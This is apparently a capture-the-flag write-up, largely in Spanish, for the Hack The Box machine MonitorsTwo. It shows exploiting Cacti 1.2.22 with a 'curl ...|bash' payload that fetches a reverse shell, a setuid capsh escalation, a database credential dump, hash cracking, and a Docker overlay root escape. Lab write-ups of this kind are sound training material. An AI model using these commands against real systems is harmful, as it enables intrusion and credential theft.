---
tags:
title: MonitorsTwo - Easy (HTB)
toc: true
permalink: /MonitorsTwo-HTB-Writeup
toc_label: Topics
toc_sticky: true
sidebar: main
---
---
# Recon

```bash
nmapf 10.129.228.231
Nmap Full scan in progress
Starting Nmap 7.98 ( https://nmap.org ) at 2026-02-19 00:14 -0500
Initiating Ping Scan at 00:14
Scanning 10.129.228.231 [4 ports]
Completed Ping Scan at 00:14, 0.37s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 00:14
Completed Parallel DNS resolution of 1 host. at 00:14, 0.50s elapsed
Initiating SYN Stealth Scan at 00:14
Scanning 10.129.228.231 [65535 ports]
Discovered open port 22/tcp on 10.129.228.231
Discovered open port 80/tcp on 10.129.228.231
Completed SYN Stealth Scan at 00:14, 8.89s elapsed (65535 total ports)
Nmap scan report for 10.129.228.231
Host is up, received echo-reply ttl 63 (0.34s latency).
Scanned at 2026-02-19 00:14:23 EST for 9s
Not shown: 61624 closed tcp ports (reset), 3909 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 9.94 seconds
           Raw packets sent: 82159 (3.615MB) | Rcvd: 70230 (2.809MB)
-e [*] IP: 10.129.228.231
[*] Puertos abiertos: 22,80
/usr/bin/xclip
-e [*] Service scanning with nmap against 22,80 Ports..
Starting Nmap 7.98 ( https://nmap.org ) at 2026-02-19 00:14 -0500
Nmap scan report for 10.129.228.231
Host is up (0.71s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Login to Cacti
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 34.30 seconds
```

## Website

El sitio principal hostea una web con el servicio de Cacti.

![image-center](/assets/images/Pasted image 20260219021747.png)

Mas en concreto, con la versión `1.2.22`

```bash
searchsploit cacti 1.2
---------------------------------------------------------- ---------------------------------
 Exploit Title                                            |  Path
---------------------------------------------------------- ---------------------------------
Cacti 1.2.12 - 'filter' SQL Injection                     | php/webapps/49810.py
Cacti 1.2.24 - Authenticated command injection when using | php/webapps/51740.txt
Cacti 1.2.26 -  Remote Code Execution (RCE) (Authenticate | php/webapps/52225.txt
Cacti 1.2.8 - Authenticated Remote Code Execution         | multiple/webapps/48144.py
Cacti 1.2.8 - Remote Code Execution                       | php/webapps/48128.py
Cacti 1.2.8 - Unauthenticated Remote Code Execution       | multiple/webapps/48145.py
Cacti v1.2.22 - Remote Command Execution (RCE)            | php/webapps/51166.py
Cacti v1.2.8 - Unauthenticated Remote Code Execution (Met | php/webapps/48159.rb
---------------------------------------------------------- ---------------------------------
Shellcodes: No Results

┌──(root㉿kali)-[/home/zsln/Desktop/zsln/monitorsTwo]
└─# searchsploit -m php/webapps/51166.py
  Exploit: Cacti v1.2.22 - Remote Command Execution (RCE)
      URL: https://www.exploit-db.com/exploits/51166
     Path: /usr/share/exploitdb/exploits/php/webapps/51166.py
    Codes: CVE-2022-46169
 Verified: False
File Type: Python script, ASCII text executable
Copied to: /home/zsln/Desktop/zsln/monitorsTwo/51166.py
```

https://github.com/r1nzleer/RCE-Cacti-1.2.22/blob/main/cve-2022-46169.py

```bash
 python3 cacti.py 10.129.228.231 'curl 10.10.17.19|bash'
[+] Authentication Bypassed!
[+] Found valid host_id: 1
[+] Found valid local_data_ids[]: 6
[+] Sending payload!
[+] Payload sent! (Status: 504)
[+] Response Body: <html>
<head><title>504 Gateway Time-out</title></head>
<body>
<center><h1>504 Gateway Time-out</h1></center>
<hr><center>nginx/1.18.0 (Ubuntu)</center>
</body>
</html>
```

```bash
gen_lin_rev 10.10.17.19 4444
[+] Wrote Linux reverse shells to /home/zsln/Desktop/zsln/monitorsTwo/index.html

┌──(root㉿kali)-[/home/zsln/Desktop/zsln/monitorsTwo]
└─#
┌──(root㉿kali)-[/home/zsln/Desktop/zsln/monitorsTwo]
└─# wwww
Command 'wwww' not found, did you mean:
  command 'dwww' from deb dwww
Try: apt install <deb name>

┌──(root㉿kali)-[/home/zsln/Desktop/zsln/monitorsTwo]
└─# wwww
┌──(root㉿kali)-[/home/zsln/Desktop/zsln/monitorsTwo]
└─# www
[eth0] 192.168.100.12
[tun0] 10.10.17.19
[/home/zsln/Desktop/zsln/monitorsTwo]
allPorts  cacti.py  exploit.py  index.html  port_scan
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.129.228.231 - - [19/Feb/2026 00:22:53] "GET / HTTP/1.1" 200 -
```

```bash
nc -nlvp 4444
listening on [any] 4444 ...
connect to [10.10.17.19] from (UNKNOWN) [10.129.228.231] 40542
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

```bash
www-data@50bca5e748b0:/tmp$ find / -perm -4000 2>/dev/null
/usr/bin/gpasswd
/usr/bin/passwd
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/newgrp
/sbin/capsh
/bin/mount
/bin/umount
/bin/su
```

```bash
www-data@50bca5e748b0:/tmp$ /sbin/capsh --gid=0 --uid=0 --addamb=cap_setuid,cap_setgid --
root@50bca5e748b0:/tmp# id
uid=0(root) gid=0(root) groups=0(root),33(www-data)
```



```bash
www-data@50bca5e748b0:/home$ cat /var/www/html/include/config.php
<?php
/*
 +-------------------------------------------------------------------------+
 | Copyright (C) 2004-2020 The Cacti Group                                 |
 |                                                                         |
 | This program is free software; you can redistribute it and/or           |
 | modify it under the terms of the GNU General Public License             |
 | as published by the Free Software Foundation; either version 2          |
 | of the License, or (at your option) any later version.                  |
 |                                                                         |
 | This program is distributed in the hope that it will be useful,         |
 | but WITHOUT ANY WARRANTY; without even the implied warranty of          |
 | MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the           |
 | GNU General Public License for more details.                            |
 +-------------------------------------------------------------------------+
 | Cacti: The Complete RRDtool-based Graphing Solution                     |
 +-------------------------------------------------------------------------+
 | This code is designed, written, and maintained by the Cacti Group. See  |
 | about.php and/or the AUTHORS file for specific developer information.   |
 +-------------------------------------------------------------------------+
 | http://www.cacti.net/                                                   |
 +-------------------------------------------------------------------------+
*/

/*
 * Make sure these values reflect your actual database/host/user/password
 */

$database_type     = 'mysql';
$database_default  = 'cacti';
$database_hostname = 'db';
$database_username = 'root';
$database_password = 'root';
$database_port     = '3306';
$database_retries  = 5;
$database_ssl      = false;
$database_ssl_key  = '';
```

```bash
www-data@50bca5e748b0:/home$ mysql -h db -u root -proot cacti -e "select username, password from user_auth;"
+----------+--------------------------------------------------------------+
| username | password                                                     |
+----------+--------------------------------------------------------------+
| admin    | $2y$10$IhEA.Og8vrvwueM7VEDkUes3pwc3zaBbQ/iuqMft/llx8utpR1hjC |
| guest    | 43e9a4ab75570f5b                                             |
| marcus   | $2y$10$vcrYth5YcCLlZaPDj6PwqOYTw68W1.3WeKlBn70JonsdW/MhFYK4C |
+----------+--------------------------------------------------------------+
```

```bash
 j hash
Created directory: /root/.john
Using default input encoding: UTF-8
Loaded 2 password hashes with 2 different salts (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
funkymonkey      (?)
```

```bash
ssh marcus@10.129.228.231
The authenticity of host '10.129.228.231 (10.129.228.231)' can't be established.
ED25519 key fingerprint is: SHA256:RoZ8jwEnGGByxNt04+A/cdluslAwhmiWqG3ebyZko+A
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.228.231' (ED25519) to the list of known hosts.
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
marcus@10.129.228.231's password:
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-147-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Thu 19 Feb 2026 05:39:09 AM UTC

  System load:                      0.0
  Usage of /:                       63.1% of 6.73GB
  Memory usage:                     14%
  Swap usage:                       0%
  Processes:                        236
  Users logged in:                  0
  IPv4 address for br-60ea49c21773: 172.18.0.1
  IPv4 address for br-7c3b7c0d00b3: 172.19.0.1
  IPv4 address for docker0:         172.17.0.1
  IPv4 address for eth0:            10.129.228.231
  IPv6 address for eth0:            dead:beef::250:56ff:fe95:d831


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

You have mail.
Last login: Thu Mar 23 10:12:28 2023 from 10.10.14.40
marcus@monitorstwo:~$ cat user.txt
31a90376585ac8611dd1ee89dacbe288
```

```bash
marcus@monitorstwo:/var/mail$ cat marcus
From: administrator@monitorstwo.htb
To: all@monitorstwo.htb
Subject: Security Bulletin - Three Vulnerabilities to be Aware Of

Dear all,

We would like to bring to your attention three vulnerabilities that have been recently discovered and should be addressed as soon as possible.

CVE-2021-33033: This vulnerability affects the Linux kernel before 5.11.14 and is related to the CIPSO and CALIPSO refcounting for the DOI definitions. Attackers can exploit this use-after-free issue to write arbitrary values. Please update your kernel to version 5.11.14 or later to address this vulnerability.

CVE-2020-25706: This cross-site scripting (XSS) vulnerability affects Cacti 1.2.13 and occurs due to improper escaping of error messages during template import previews in the xml_path field. This could allow an attacker to inject malicious code into the webpage, potentially resulting in the theft of sensitive data or session hijacking. Please upgrade to Cacti version 1.2.14 or later to address this vulnerability.

CVE-2021-41091: This vulnerability affects Moby, an open-source project created by Docker for software containerization. Attackers could exploit this vulnerability by traversing directory contents and executing programs on the data directory with insufficiently restricted permissions. The bug has been fixed in Moby (Docker Engine) version 20.10.9, and users should update to this version as soon as possible. Please note that running containers should be stopped and restarted for the permissions to be fixed.

We encourage you to take the necessary steps to address these vulnerabilities promptly to avoid any potential security breaches. If you have any questions or concerns, please do not hesitate to contact our IT department.

Best regards,

Administrator
CISO
Monitor Two
Security Team
```
https://github.com/jrbH4CK/CVE-2021-41091

```bash
root@50bca5e748b0:/tmp# ./d.sh
Ejecutal el script principal.sh en la maquina principal
```

```bash
marcus@monitorstwo:/tmp$ ./principal.sh
Posibles directorios: /var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged
Ruta del archivo test.txt: /var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged/tmp
Ingresa la siguiente linea en la terminal: /var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged/bin/bash -p
Posibles directorios: /var/lib/docker/overlay2/4ec09ecfa6f3a290dc6b247d7f4ff71a398d4f17060cdaf065e8bb83007effec/merged
El archivo test.txt no se encontró en el directorio actual.
marcus@monitorstwo:/tmp$ /var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged/bin/bash -p
bash-5.1# whoami
root
```

```bash
bash-5.1# cat root.txt
9495a70107ee0d27036f11000bd5e111
```